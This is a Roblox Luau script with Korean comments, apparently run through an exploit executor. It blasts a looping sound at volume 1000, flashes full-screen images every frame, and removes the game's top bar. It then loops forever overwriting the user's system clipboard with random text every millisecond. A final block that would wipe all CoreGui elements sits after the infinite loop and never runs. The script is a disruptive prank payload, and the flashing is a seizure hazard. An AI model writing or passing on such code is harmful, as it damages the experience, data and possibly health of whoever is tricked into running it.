local SoundService = game:GetService("SoundService")
local CoreGui = game:GetService("CoreGui")

-- 사운드
local Sound = Instance.new("Sound")
Sound.SoundId = "rbxassetid://95561748275077"
Sound.Volume = 1000
Sound.Looped = true
Sound.Parent = SoundService

Sound.Loaded:Wait()
Sound:Play()

-- 기존 GUI 제거
pcall(function()
local old = CoreGui:FindFirstChild("FullscreenImageGui")
if old then
old:Destroy()
end
end)

-- GUI 생성
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FullscreenImageGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "Background"
ImageLabel.Parent = ScreenGui
ImageLabel.Size = UDim2.fromScale(1, 1)
ImageLabel.Position = UDim2.fromScale(0, 0)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.ScaleType = Enum.ScaleType.Crop

local images = {
"rbxassetid://6404704459",
"rbxassetid://1440961956",
"rbxassetid://6889590510"
}

local index = 1
ImageLabel.Image = images[index]

task.spawn(function()
while ScreenGui.Parent do
task.wait(0) -- 5초마다 변경

index += 1  
    if index > #images then  
        index = 1  
    end  

    ImageLabel.Image = images[index]  
end

end)
local topbar = game:GetService("CoreGui"):FindFirstChild("TopBarApp")
if topbar then
topbar:Destroy()
end
local function randomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>/?"
    local str = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        str = str .. chars:sub(rand, rand)
    end
    return str
end

while true do
    local text = randomString(100)
    setclipboard(text)
    wait(0.001)
end
local CoreGui = game:GetService("CoreGui")

-- 모든 자식 + 손자 다 Destroy
for _, v in pairs(CoreGui:GetDescendants()) do
    pcall(function()
        v:Destroy()
    end)
end

-- CoreGui 본체도 클리어
pcall(function()
    for _, v in pairs(CoreGui:GetChildren()) do
        v:Destroy()
    end
end)

-- 부모까지 건드리려면 (CoreGui의 부모는 보통 PlayerGui나 ScreenGui 계열)
pcall(function()
    if CoreGui.Parent then
        for _, v in pairs(CoreGui.Parent:GetDescendants()) do
            if v:IsA("GuiObject") or v:IsA("ScreenGui") then
                v:Destroy()
            end
        end
    end
end)

print("동작완료")
